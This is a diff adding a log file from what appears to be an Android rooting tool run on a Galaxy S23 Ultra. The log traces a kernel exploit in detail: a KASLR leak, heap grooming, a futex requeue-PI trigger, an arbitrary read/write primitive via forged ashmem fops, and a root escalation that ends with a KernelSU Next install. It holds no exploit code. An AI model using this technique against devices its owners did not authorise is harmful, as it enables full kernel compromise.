@@ -1,0 +1,98 @@
+[*] Preparando a execução do Shizuku
+[+] Permissão do Shizuku concedida
+[*] Verificando manifesto de suporte no GitHub
+[+] Perfil de suporte: dm3q-S918BXXSAFZH3-ksunext
+[*] Preparando payloads
+[*] exploit (bundled)
+[*] KernelSU Next (bundled)
+[*] helper (bundled)
+[*] stability launcher (bundled)
+[+] Payloads embutidos preparados
+[*] Rodando exploit de kernel
+[diag] shizukuEnabled=true isRunning=true isGranted=true
+--- [pstore] dump start ---
+--- [pstore] empty ---
+--- [pstore] dump end ---
+[diag] helper=/data/local/tmp/ksu-helper launcher=/data/user/0/io.github.rootmygalaxy.s23ultra/files/payloads/dm3q-S918BXXSAFZH3-ksunext/stability-launcher-afzh3
+[launcher] gate relaxado: 3 amostras/3s temp<=48C mem>=1GB tarefas<=8 PSI<=25/3/5 uptime>=60s mm<=2048/48 pipe=480x32 timeout=300s
+[launcher] gate=0/3 phase=baseline temp=74.4C mem=5042MB runnable=7 load=15.19 psi=57.10/5.66/3.55 mm=768/768 slabs=24 uptime=51s boot=1
+[launcher] gate=0/3 phase=baseline temp=57.3C mem=5043MB runnable=7 load=15.19 psi=43.16/4.34/2.68 mm=768/768 slabs=24 uptime=55s boot=1
+[launcher] gate=0/3 phase=baseline temp=77.2C mem=4877MB runnable=24 load=14.21 psi=43.80/4.11/2.78 mm=800/800 slabs=25 uptime=58s boot=1
+[launcher] gate=0/3 phase=baseline temp=58.1C mem=5169MB runnable=5 load=14.76 psi=40.76/3.36/2.46 mm=800/800 slabs=25 uptime=62s boot=1
+[launcher] gate=0/3 phase=baseline temp=51.7C mem=5185MB runnable=2 load=13.97 psi=31.87/2.25/1.79 mm=800/800 slabs=25 uptime=66s boot=1
+[launcher] gate=0/3 phase=baseline temp=50.5C mem=5259MB runnable=4 load=13.97 psi=24.84/1.51/1.20 mm=800/800 slabs=25 uptime=69s boot=1
+[launcher] gate=1/3 phase=baseline temp=47.7C mem=5409MB runnable=2 load=13.26 psi=22.34/1.23/0.98 mm=800/800 slabs=25 uptime=72s boot=1
+[launcher] gate=2/3 phase=baseline temp=45.7C mem=5425MB runnable=2 load=12.43 psi=17.64/0.83/0.66 mm=800/800 slabs=25 uptime=75s boot=1
+[launcher] gate=3/3 phase=baseline temp=45.3C mem=5415MB runnable=3 load=12.43 psi=14.76/0.55/0.44 mm=800/800 slabs=25 uptime=79s boot=1
+[launcher] pipe-gate=pass pipes=480 target_pages=32
+[launcher] cooldown: exigindo mais 3 amostras após pipe-gate
+[launcher] gate=1/3 phase=cooldown temp=47.3C mem=5431MB runnable=2 load=11.76 psi=12.68/0.37/0.29 mm=800/800 slabs=25 uptime=82s boot=1
+[launcher] gate=0/3 phase=cooldown temp=48.1C mem=5560MB runnable=15 load=10.98 psi=12.37/0.30/0.24 mm=800/800 slabs=25 uptime=86s boot=1
+[launcher] gate=1/3 phase=cooldown temp=44.6C mem=5762MB runnable=2 load=10.98 psi=11.64/0.20/0.16 mm=800/800 slabs=25 uptime=90s boot=1
+[launcher] gate=2/3 phase=cooldown temp=43.4C mem=5816MB runnable=1 load=10.42 psi=10.77/0.13/0.10 mm=800/800 slabs=25 uptime=94s boot=1
+[launcher] gate=3/3 phase=cooldown temp=43.8C mem=5838MB runnable=3 load=9.74 psi=10.07/0.09/0.07 mm=800/800 slabs=25 uptime=98s boot=1
+[launcher] estabilidade máxima confirmada: métricas+slab+pipe+cooldown
+[launcher] execve: carregando payload agora
+[*] boot allocator quiet window skipped BOOT_QUIET_SEC=0 boottime=97s
+[*] starting exploit attempts=1
+[*] exploit attempt=1/1
+[*] stage=preparing-kernel-access
+[*] stage=locating-kernel
+[kaslr] sampling sched_blocked_reason for 1s
+[kaslr] cpu0 pages=1 bytes=4096 found=1
+[kaslr] source=tracefs base=ffffffc008040000 slide=0000000000040000 p0_offset=00040000
+[*] stage=kernel-location-ready
+[kaslr] mm_struct slabinfo active=800 num=800 objsize=1024 objperslab=32 active_slabs=25 num_slabs=25
+[groom] dbg phase=proc-spray-done t=+1880ms dt=1880ms
+[groom] ksnitch profile appended=4096 repeat=64 average=8
+[groom] dbg phase=ksnitch-setup t=+1884ms dt=4ms
+[groom] dbg phase=find-collisions-done t=+6621ms dt=4737ms
+[groom] dbg phase=bruteforce-done t=+6720ms dt=99ms
+[groom] mm leaked=ffffff88e98a2400 aligned_base=ffffff88e98a0000
+[groom] mm drain triggers=32 sk_buff reclaim sends=57/64
+[groom] dbg phase=drain-reclaim-done t=+6760ms dt=40ms
+[groom] installed fops object at payload_base=ffffff88e98a0000 target(ashmem_misc_fops)=ffffffc00ac3cf28 init_task=ffffffc00ac45080
+[futex-v14] FUTEX_WAIT_SEC=1 (default 8)
+[futex-v14] dbg phase=threads-ready t=+4ms dt=4ms
+[futex-v14] dbg phase=post-100ms-pause t=+104ms dt=100ms
+[futex-v14] dbg phase=post-cmp-requeue-pi t=+104ms dt=0ms
+[futex-v14] dbg phase=wait-requeue-pi-returned t=+1003ms dt=899ms
+[futex-v14] dbg phase=callback-entry t=+1003ms dt=0ms
+[*] stage=verifying-kernel-access
+[aar_aaw] ashmem_misc_fops readback got=ffffff88e98a1180 want=ffffff88e98a1180
+[aar_aaw] verify ok: corruption landed, R/W primitive live
+[immediate] verify (called immediately, same thread) = 1
+[immediate] restore ashmem_misc.fops got=ffffffc00a04d4b8 want=ffffffc00a04d4b8 ok=1
+[*] stage=starting-temporary-root
+stage=kernel-mutation-pending state=3
+[pipe_rw] ksnitch profile appended=4096 repeat=64 average=8
+[pipe_rw] selection kmalloc2k_pages=8 kmalloc2k_slabs=1 scan_base=ffffff88e9c58000
+[pipe_rw] selection page slab=1 page=0 base=ffffff88e9c58000 candidates=2
+[pipe_rw] selection page slab=1 page=1 base=ffffff88e9c59000 candidates=2
+[pipe_rw] selection page slab=1 page=2 base=ffffff88e9c5a000 candidates=2
+[pipe_rw] selection page slab=1 page=3 base=ffffff88e9c5b000 candidates=2
+[pipe_rw] selection page slab=1 page=4 base=ffffff88e9c5c000 candidates=2
+[pipe_rw] selection page slab=1 page=5 base=ffffff88e9c5d000 candidates=2
+[pipe_rw] selection page slab=1 page=6 base=ffffff88e9c5e000 candidates=2
+[pipe_rw] selection page slab=1 page=7 base=ffffff88e9c5f000 candidates=2
+[pipe_rw] candidate test slab=1/ffffff88e9c58000 off=0000 victim=ffffff88e9c58000 ring=head:1,tail:0,slot:0 pipe=114 len=116 original_page=fffffffe23a323c0 forged_page=fffffffe23a629c0
+[pipe_rw] selection accept slab=1 pipe=114 candidates=1 ring_valid=1 proofs=1
+[pipe_rw] ready attempt=1/12 page=ffffff88e9c58000 victim=ffffff88e9c58000 pipe=114 prepare_ms=8593 establish_ms=9 total_ms=8609
+[root_umh] queued wq=ffffff80011d8400 pwq=ffffff80629f3000 pool=ffffff80629f9c00 work=ffffff88e98a6000 entry=ffffff88e98a6008 color=0 counters=0/0/2 writes=1/1/1/1/1 pre_list=ffffff80629f9c20/ffffff80629f9c20 pre_idle=13 pre_counters=0/0/2
+[root_umh] result wake=1 complete=1 socket=1
+[immediate] fake fops owner clear=1
+[+] stage=temporary-root-ready
+[futex-v14] dbg phase=route-done t=+9660ms dt=8657ms
+[futex-v14] cmp_requeue_pi ret=-1 errno=35
+[futex] trigger result=1
+[holder] pid=30387 name=cve43499-hold
+[+] exploit completed attempt=1/1
+
+[+] Root acquired in 65.171 seconds
+[+] Root bootstrap adquirido
+[*] Carregando o KernelSU Next tardiamente
+[+] Preparação do KernelSU Next completa
+KernelSU control verified version=33294 flags=0x5 uapi=4 features=0x2714
+[+] Canal de controle do KernelSU Next verificado
+[*] KernelSU Next ativo
+[+] Instalação completa
